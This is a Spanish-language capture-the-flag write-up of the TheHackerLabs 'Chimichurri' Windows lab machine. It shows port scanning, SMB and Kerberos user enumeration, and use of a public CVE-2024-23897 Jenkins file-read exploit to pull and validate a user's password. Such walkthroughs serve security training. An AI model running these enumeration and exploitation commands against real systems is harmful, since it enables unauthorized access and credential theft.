---
title: "Chimichurri - TheHackerLabs"
date: 2025-01-23
draft: false
slug: "THL-writeup-chimichurri"
excerpt: "Una máquina un poco difícil en cuanto a la intrusión, ya que si no sigues las pistas, puedes perderte. En los escaneos, identificamos que estamos contra un Directorio Activo e identificamos un servidor Jenkins. Enumeramos algunos servicios y el servidor Jenkins, antes de llegar al servicio SMB. Después de enumerar el servicio SMB, encontramos un archivo que contiene el nombre de un usuario y la pista en donde se encuentra su contraseña. Usando un Exploit dirigido a Jenkins, podemos aplicar LFI y con esto, logramos obtener la contraseña del usuario encontrado. Conectándonos a la máquina víctima con evil-winrm, identificamos que nuestro usuario tiene el privilegio SeImpersonatePrivilege, lo que nos permite usar Juicy Potato para escalar privilegios y convertirnos en Administrador. El problema es que no podremos ver las flags, a menos que cambiemos la contraseña del Administrador."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Windows", "Active Directory", "SMB", "DNS", "Kerberos", "Jenkins", "SMB Enumeration", "Information Leakage", "Local File Inclusion (LFI)", "CVE-2024-23897 (LFI)", "Privesc - Juicy Potato", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "whatweb"
  - "dig"
  - "crackmapexec"
  - "smbclient"
  - "kerbrute"
  - "smbmap"
  - "searchsploit"
  - "python3"
  - "evil-winrm"
  - "impacket-GetNPUsers"
  - "impacket-GetUserSPNs"
  - "whoami"
  - "JuicyPotato.exe"
  - "msfvenom"
  - "rlwrap"
  - "nc"
  - "net user"
links:
  - "https://www.exploit-db.com/exploits/51993"
  - "https://www.cloudsek.com/blog/xposing-the-exploitation-how-cve-2024-23897-led-to-the-compromise-of-github-repos-via-jenkins-lfi-vulnerability"
  - "https://github.com/ohpe/juicy-potato/releases/tag/v0.1"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-chimichurri/Chimichurri.jpg"
---

## Recopilación de Información {#Recopilacion}

### Descubrimiento de Hosts {#Hosts}

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.

Lo haremos primero con **nmap**:
```bash
nmap -sn 192.168.1.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 13:34 CST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
...
...
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.1.50
Host is up (0.0010s latency).
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for Tu_IP
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.89 seconds
```

Vamos a probar la herramienta **arp-scan**:
```bash
arp-scan -I eth0 -g 192.168.1.0/24
Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
...
192.168.1.50   XX       PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.165 seconds (118.24 hosts/sec). 3 responded
```

Encontramos nuestro objetivo y es: `192.168.1.50`

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.50
PING 192.168.1.50 (192.168.1.50) 56(84) bytes of data.
64 bytes from 192.168.1.50: icmp_seq=1 ttl=128 time=1.80 ms
64 bytes from 192.168.1.50: icmp_seq=2 ttl=128 time=0.741 ms
64 bytes from 192.168.1.50: icmp_seq=3 ttl=128 time=0.624 ms
64 bytes from 192.168.1.50: icmp_seq=4 ttl=128 time=0.812 ms

--- 192.168.1.50 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3058ms
rtt min/avg/max/mdev = 0.624/0.993/1.797/0.468 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.50 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 13:34 CST
Initiating ARP Ping Scan at 13:34
Scanning 192.168.1.50 [1 port]
Completed ARP Ping Scan at 13:34, 0.13s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:34
Scanning 192.168.1.50 [65535 ports]
Discovered open port 139/tcp on 192.168.1.50
Discovered open port 53/tcp on 192.168.1.50
Discovered open port 135/tcp on 192.168.1.50
Discovered open port 445/tcp on 192.168.1.50
Discovered open port 88/tcp on 192.168.1.50
Discovered open port 5985/tcp on 192.168.1.50
Discovered open port 3268/tcp on 192.168.1.50
Discovered open port 49667/tcp on 192.168.1.50
Discovered open port 9389/tcp on 192.168.1.50
Discovered open port 49664/tcp on 192.168.1.50
Discovered open port 6969/tcp on 192.168.1.50
Discovered open port 464/tcp on 192.168.1.50
Discovered open port 49665/tcp on 192.168.1.50
Discovered open port 65137/tcp on 192.168.1.50
Discovered open port 47001/tcp on 192.168.1.50
Discovered open port 3269/tcp on 192.168.1.50
Discovered open port 49694/tcp on 192.168.1.50
Discovered open port 49672/tcp on 192.168.1.50
Discovered open port 49675/tcp on 192.168.1.50
Discovered open port 593/tcp on 192.168.1.50
Discovered open port 49666/tcp on 192.168.1.50
Increasing send delay for 192.168.1.50 from 0 to 5 due to max_successful_tryno increase to 4
Discovered open port 49669/tcp on 192.168.1.50
Discovered open port 49670/tcp on 192.168.1.50
Discovered open port 389/tcp on 192.168.1.50
Increasing send delay for 192.168.1.50 from 5 to 10 due to max_successful_tryno increase to 5
Discovered open port 636/tcp on 192.168.1.50
Increasing send delay for 192.168.1.50 from 10 to 20 due to max_successful_tryno increase to 6
Completed SYN Stealth Scan at 13:35, 61.03s elapsed (65535 total ports)
Nmap scan report for 192.168.1.50
Host is up, received arp-response (0.00078s latency).
Scanned at 2025-01-23 13:34:51 CST for 61s
Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
5985/tcp  open  wsman            syn-ack ttl 128
6969/tcp  open  acmsoda          syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
47001/tcp open  winrm            syn-ack ttl 128
49664/tcp open  unknown          syn-ack ttl 128
49665/tcp open  unknown          syn-ack ttl 128
49666/tcp open  unknown          syn-ack ttl 128
49667/tcp open  unknown          syn-ack ttl 128
49669/tcp open  unknown          syn-ack ttl 128
49670/tcp open  unknown          syn-ack ttl 128
49672/tcp open  unknown          syn-ack ttl 128
49675/tcp open  unknown          syn-ack ttl 128
49694/tcp open  unknown          syn-ack ttl 128
65137/tcp open  unknown          syn-ack ttl 128
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 61.33 seconds
           Raw packets sent: 201553 (8.868MB) | Rcvd: 65540 (2.622MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo varios puertos que me indican que estamos contra un **Active Directory**, por ejemplo, el **puerto 88** que es el **servicio Kerberos**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,6969,9389,47001,49664,49665,49666,49667,49669,49670,49672,49675,49694,65137 192.168.1.50 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 13:36 CST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Stats: 0:00:49 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 64.00% done; ETC: 13:37 (0:00:28 remaining)
Nmap scan report for 192.168.1.50
Host is up (0.00059s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-23 18:26:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: chimichurri.thl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: chimichurri.thl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6969/tcp  open  http          Jetty 10.0.11

|_http-title: Panel de control [Jenkins]
|_http-server-header: Jetty(10.0.11)
| http-robots.txt: 1 disallowed entry 
|_/
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
65137/tcp open  msrpc         Microsoft Windows RPC
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: CHIMICHURRI; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-time: 
|   date: 2025-01-23T18:27:28
|_  start_date: 2025-01-23T12:29:02
|_clock-skew: -1h09m54s
|_nbstat: NetBIOS name: CHIMICHURRI, NetBIOS user: <unknown>, NetBIOS MAC: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.45 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Muy bien, me da curiosidad el **puerto 6969** porque al parecer está activo un **servidor Jenkins**. Además, obtuvimos el dominio del **AD**, por lo que podemos registrarlo en el `/etc/hosts`.

Vamos a comenzar a analizar los servicios en el siguiente orden: **DNS, Jenkins, SMB, Kerberos**.

Veamos qué podemos encontrar.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio DNS {#DNS}

Veamos qué información podemos obtener con la herramienta **dig**:
```bash
dig @192.168.1.50 chimichurri.thl

; <<>> DiG 9.20.4-3-Debian <<>> @192.168.1.50 chimichurri.thl
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 1794
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: 6080212094defe76e6 (echoed)
;; QUESTION SECTION:
;chimichurri.thl.               IN      A

;; ANSWER SECTION:
chimichurri.thl.        600     IN      A       192.168.1.50

;; Query time: 4 msec
;; SERVER: 192.168.1.50#53(192.168.1.50) (UDP)
;; WHEN: Thu Jan 23 15:41:56 CST 2025
;; MSG SIZE  rcvd: 72
```
Excelente, nos responde.

Veamos si hay algún correo registrado:
```bash
dig @192.168.1.50 chimichurri.thl mx

; <<>> DiG 9.20.4-3-Debian <<>> @192.168.1.50 chimichurri.thl mx
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 59507
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: 0d83okee93fe25fcf (echoed)
;; QUESTION SECTION:
;chimichurri.thl.               IN      MX

;; AUTHORITY SECTION:
chimichurri.thl.        3600    IN      SOA     chimichurri.chimichurri.thl. hostmaster.chimichurri.thl. 45 900 600 86400 3600

;; Query time: 3 msec
;; SERVER: 192.168.1.50#53(192.168.1.50) (UDP)
;; WHEN: Thu Jan 23 15:42:37 CST 2025
;; MSG SIZE  rcvd: 115
```
No hay ninguno.

Veamos si hay algún otro servidor registrado:
```bash
dig @192.168.1.50 chimichurri.thl ns

; <<>> DiG 9.20.4-3-Debian <<>> @192.168.1.50 chimichurri.thl ns
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 57564
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
; COOKIE: 693ei93jd87dccdfe (echoed)
;; QUESTION SECTION:
;chimichurri.thl.               IN      NS

;; ANSWER SECTION:
chimichurri.thl.        3600    IN      NS      chimichurri.chimichurri.thl.

;; ADDITIONAL SECTION:
chimichurri.chimichurri.thl. 3600 IN    A       192.168.1.50

;; Query time: 3 msec
;; SERVER: 192.168.1.50#53(192.168.1.50) (UDP)
;; WHEN: Thu Jan 23 15:42:53 CST 2025
;; MSG SIZE  rcvd: 98
```
No aparece ninguno.

Por último, vamos a tratar de aplicar un **ataque de transferencia de zona**:
```bash
dig @192.168.1.50 chimichurri.thl axfr

; <<>> DiG 9.20.4-3-Debian <<>> @192.168.1.50 chimichurri.thl axfr
; (1 server found)
;; global options: +cmd
; Transfer failed.
```
Fallo, no podemos obtener más información.

### Analizando Servidor Jenkins {#Jenkins}

Vamos a tratar de entrar al **servidor Jenkins** y veamos qué obtenemos.

Recuerda especificar el puerto:

<p align="center">
<img src="/assets/images/THL-writeup-chimichurri/Captura1.png">
</p>

Pudimos entrar.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-chimichurri/Captura2.png">
</p>

Mmmm no veo algo que nos ayude del todo.

Quizá con la herramienta **whatweb**, podemos encontrar algo más:
```bash
whatweb http://192.168.1.50:6969
http://192.168.1.50:6969 [200 OK] Cookies[JSESSIONID.1axasjn3], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(10.0.11)], HttpOnly[JSESSIONID.1aec7c13], IP[192.168.1.50], Jenkins[2.361.4], Jetty[10.0.11], OpenSearch[/opensearch.xml], Prototype, Script[text/javascript], Title[Panel de control [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson-theme,referrer-policy,cross-origin-opener-policy,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
```

Genial, tenemos la versión de **Jenkins** que están usando, que es la **versión 2.361.4**.

Parece que hay un usuario registrado que se llama **Perro**:

<p align="center">
<img src="/assets/images/THL-writeup-chimichurri/Captura3.png">
</p>

Pero no muestra nada más que su nombre, guardémoslo por si acaso.

Tenemos acceso a un login, pero aún no tenemos credenciales válidas que podamos usar:

<p align="center">
<img src="/assets/images/THL-writeup-chimichurri/Captura4.png">
</p>

Creo que por ahora no podemos hacer más.

Aunque, como ya tenemos una versión del servicio, podemos buscar un Exploit.

Veamos si hay algo registrado en Kali, usando la herramienta **searchsploit**:
```bash
searchsploit jenkins 2.361.4
Exploits: No Results
Shellcodes: No Results
```

Nada en específico, pero es posible que exista un Exploit de una versión superior o anterior que pueda ser usado contra esta versión.

Busquemos **Jenkins** en general:
```bash
searchsploit jenkins
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path

|---|---|
...
...
Jenkins 2.235.3 - 'Description' Stored XSS                                                                                                                                     | java/webapps/49237.txt
Jenkins 2.235.3 - 'tooltip' Stored Cross-Site Scripting                                                                                                                        | java/webapps/49232.txt
Jenkins 2.235.3 - 'X-Forwarded-For' Stored XSS                                                                                                                                 | java/webapps/49244.txt
Jenkins 2.441 - Local File Inclusion                                                                                                                                           | java/webapps/51993.py
Jenkins 2.63 - Sandbox bypass in pipeline: Groovy plug-in                                                                                                                      | java/webapps/48904.txt
Jenkins < 1.650 - Java Deserialization
...
...
```

Me llama la atención el Exploit que aplica un **LFI**, pero aún no vamos a usarlo.

Sigamos investigando otros servicios.

### Enumeración de Servicio SMB {#SMB}

Obtengamos información del **servicio SMB**:
```bash
crackmapexec smb 192.168.1.50
SMB         192.168.1.50   445    CHIMICHURRI      [*] Windows 10 / Server 2016 Build 14393 x64 (name:CHIMICHURRI) (domain:chimichurri.thl) (signing:True) (SMBv1:False)
```
Parece que vamos a necesitar un usuario válido para poder ver los archivos compartidos.

Veamos si podemos listarlos con **smbclient**:
```bash
smbclient -L //192.168.1.50// -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        drogas          Disk      
        IPC$            IPC       IPC remota
        NETLOGON        Disk      Recurso compartido del servidor de inicio de sesión 
        SYSVOL          Disk      Recurso compartido del servidor de inicio de sesión 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.1.50 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Excelente, podemos verlos y parece que hay un recurso al que podemos conectarnos.

Tratemos de entrar directamente en ese recurso llamado **drogas**:
```bash
smbclient //192.168.1.50/drogas -N
Try "help" to get a list of possible commands.
smb: \>
```
Estamos dentro.

Veamos qué recursos hay dentro:
```bash
smb: \> dir
  .                                   D        0  Thu Jun 27 04:20:49 2024
  ..                                  D        0  Thu Jun 27 04:20:49 2024
  credenciales.txt                    A       95  Sun Jun 30 11:19:03 2024

                7735807 blocks of size 4096. 4297969 blocks available
```
Parece que tenemos unas credenciales.

Vamos a descargar ese archivo:
```bash
smb: \> get credenciales.txt
getting file \credenciales.txt of size 95 as credenciales.txt (23.2 KiloBytes/sec) (average 23.2 KiloBytes/sec)
```

Y veamos su contenido:
```bash
cat credenciales.txt
Todo es mejor en con el usuario hacker, en su escritorio estan sus claves de acceso como perico
```
Muy bien, tenemos otro usuario y nos están dando una pista de dónde buscar su contraseña.

### Enumeración de Servicio Kerberos {#Kerberos}

Ahora ya tenemos un par de usuarios y podemos comprobar si este existe dentro del **servicio Kerberos** usando la herramienta **kerbrute**.

Vamos a meterlos dentro de un archivo de texto:
```bash
nano users.txt
--------------
Perro
perro
hacker
```

Y usaremos el **modo userenum** de la herramienta **kerbrute** para comprobar que existen dentro de la máquina:
```bash
./kerbrute_linux_amd64 userenum -d chimichurri.thl --dc 192.168.1.50 users.txt
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/23/25 - Ronnie Flathers @ropnop

2025/01/23 18:04:56 >  Using KDC(s):
2025/01/23 18:04:56 >   192.168.1.50:88

2025/01/23 18:04:56 >  [+] VALID USERNAME:       hacker@chimichurri.thl
2025/01/23 18:04:56 >  Done! Tested 3 usernames (1 valid) in 0.023 seconds
```
Bien, el **usuario hacker** sí existe.

Por último, vamos a probar si existen más usuarios usando un wordlist de **seclist**:
```bash
./kerbrute_linux_amd64 userenum -d chimichurri.thl --dc 192.168.1.50 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/23/25 - Ronnie Flathers @ropnop

2025/01/23 17:40:06 >  Using KDC(s):
2025/01/23 17:40:06 >   192.168.1.50:88

2025/01/23 17:40:10 >  [+] VALID USERNAME:       hacker@chimichurri.thl
2025/01/23 17:40:25 >  [+] VALID USERNAME:       Hacker@chimichurri.thl
2025/01/23 17:42:10 >  [+] VALID USERNAME:       invitado@chimichurri.thl
2025/01/23 17:47:32 >  [+] VALID USERNAME:       administrador@chimichurri.thl
2025/01/23 17:48:01 >  [+] VALID USERNAME:       HACKER@chimichurri.thl
```
Comprobamos que existe el **usuario hacker** y también vemos que existe el **usuario invitado**.

#### Enumeración de Servicio SMB con smbmap {#SMBMAP}

Probaremos si se puede usar algún usuario para poder listar los recursos compartidos del **servicio SMB** con la herramienta **smbmap**.

Usemos primero el **usuario hacker**:
```bash
smbmap -H 192.168.1.50 -u 'hacker'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
[*] Closed 1 connections
```
No funciona.

Ahora usemos el **usuario invitado**:
```bash
smbmap -H 192.168.1.50 -u 'invitado'
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.1.50:445       Name: chimichurri.thl           Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        drogas                                                  READ ONLY
        IPC$                                                    READ ONLY       IPC remota
        NETLOGON                                                NO ACCESS       Recurso compartido del servidor de inicio de sesión 
        SYSVOL                                                  NO ACCESS       Recurso compartido del servidor de inicio de sesión 
[*] Closed 1 connections
```
Excelente, este usuario sí nos sirve para listar los archivos compartidos.

Ahora podemos listar el recurso **drogas**:
```bash
smbmap -H 192.168.1.50 -u 'invitado' -r drogas
    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.1.50:445       Name: chimichurri.thl           Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        drogas                                                  READ ONLY
        ./drogas
        dr--r--r--                0 Thu Jun 27 04:20:49 2024    .
        dr--r--r--                0 Thu Jun 27 04:20:49 2024    ..
        fr--r--r--               95 Sun Jun 30 11:19:02 2024    credenciales.txt
        IPC$                                                    READ ONLY       IPC remota
        NETLOGON                                                NO ACCESS       Recurso compartido del servidor de inicio de sesión 
        SYSVOL                                                  NO ACCESS       Recurso compartido del servidor de inicio de sesión 
[*] Closed 1 connections
```
Genial, lo podemos ver.

Descarguemos ese archivo (esto es opcional):
```bash
smbmap -H 192.168.1.50 -u 'invitado' --download drogas/credenciales.txt

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
[+] Starting download: drogas\credenciales.txt (95 bytes)
[+] File output to: /../TheHackersLabs/Chimichurri/content/192.168.1.50-drogas_credenciales.txt  
[*] Closed 1 connections
```
Y ya con esto, podemos continuar.

## Explotación de Vulnerabilidades {#Explotacion}

### Probando Exploit: Jenkins 2.441 - Local File Inclusion y Ganando Acceso a la Máquina {#JenkinsExploit}

Juntando lo que tenemos, parece que la idea es utilizar un Exploit que nos permita ver el archivo que contiene la contraseña del **usuario hacker**, siendo un archivo que se encuentra en su escritorio y que se llama **perico**.

Regresando con el servidor Jenkins, existe un Exploit que permite aplicar **LFI**:
* <a href="https://www.exploit-db.com/exploits/51993" target="_blank">Jenkins 2.441 - Local File Inclusion</a>

El siguiente blog, explica cómo usaron este Exploit:
* <a href="https://www.cloudsek.com/blog/xposing-the-exploitation-how-cve-2024-23897-led-to-the-compromise-of-github-repos-via-jenkins-lfi-vulnerability" target="_blank">Exposing the Exploitation: How CVE-2024-23897 Led to the Compromise of Github Repos via Jenkins LFI Vulnerability</a>

Aunque no sea la misma versión para el que está ideado, vamos a probarlo.

Copiemos el Exploit en nuestro directorio de trabajo:
```bash
searchsploit -m java/webapps/51993.py
  Exploit: Jenkins 2.441 - Local File Inclusion
      URL: https://www.exploit-db.com/exploits/51993
     Path: /usr/share/exploitdb/exploits/java/webapps/51993.py
    Codes: CVE-2024-23897
 Verified: False
File Type: Python script, ASCII text executable
```
Parece que está hecho en **Python3**.

Vamos a ejecutarlo para ver cómo usarlo:
```bash
python3 51993.py -h
usage: 51993.py [-h] -u URL [-p PATH]

Local File Inclusion exploit for CVE-2024-23897

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     The url of the vulnerable Jenkins service. Ex: http://helloworld.com/
  -p PATH, --path PATH  The absolute path of the file to download
```
Bien, solamente tenemos que indicar la URL y especificar el path del archivo que queremos ver.

Intentémoslo de la misma forma como lo hicieron en el blog:
```bash
python3 51993.py -u http://192.168.1.50:6969 -p /Users/hacker/Desktop/perico.txt
hacker:Perico69
```
Muy bien, funcionó.

Vamos a comprobar si la contraseña es válida, usando **crackmapexec**:
```bash
crackmapexec smb 192.168.1.50 -u 'hacker' -p 'Perico69'
SMB         192.168.1.50   445    CHIMICHURRI      [*] Windows 10 / Server 2016 Build 14393 x64 (name:CHIMICHURRI) (domain:chimichurri.thl) (signing:True) (SMBv1:False)
SMB         192.168.1.50   445    CHIMICHURRI      [+] chimichurri.thl\hacker:Perico69
```
Es válida.

